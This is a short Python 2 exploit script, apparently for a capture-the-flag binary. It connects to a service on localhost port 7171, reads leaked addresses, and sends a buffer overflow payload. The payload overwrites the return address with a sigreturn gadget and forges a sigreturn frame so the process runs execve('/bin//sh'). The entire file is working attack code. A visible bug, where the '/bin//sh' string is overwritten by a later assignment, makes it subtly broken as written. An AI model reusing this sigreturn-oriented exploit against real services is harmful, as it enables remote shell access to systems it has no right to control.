from socket import create_connection
import struct
import string
from Frame import SigreturnFrame

all_letters = string.letters[26:]
ip = "localhost"

SIGRETURN_IND = 0x08048ee3
INT_80        = 0x08048ee8

def recv_n_bytes(sock, n):
    c = 0
    data = ''
    while c < n:
        data += sock.recv(1)
        c += 1
    return data

s = create_connection((ip, 7171))
buffer_address = recv_n_bytes(s, 8)
print repr(buffer_address)
buffer_address = struct.unpack("<I", buffer_address)[0]
print hex(buffer_address)

page = recv_n_bytes(s, 8)
print repr(page)
page = struct.unpack("<I", page)[0]
print hex(page)

sploit  = "/bin//sh"
sploit += struct.pack("<I", 0x0)
sploit  = "\x90" * (0x208 - len("/bin//sh") - 4)
sploit += "B" * 4
sploit += struct.pack("<I", SIGRETURN_IND)

frame = SigreturnFrame(nulls_allowed=True)
frame.set_regvalue("eax", 11)
frame.set_regvalue("ebx", buffer_address)
frame.set_regvalue("ecx", buffer_address + 8)
frame.set_regvalue("edx", 0)
frame.set_regvalue("eip", INT_80)
frame.set_regvalue("esp", buffer_address)

sploit += frame.get_frame()
s.send(sploit)
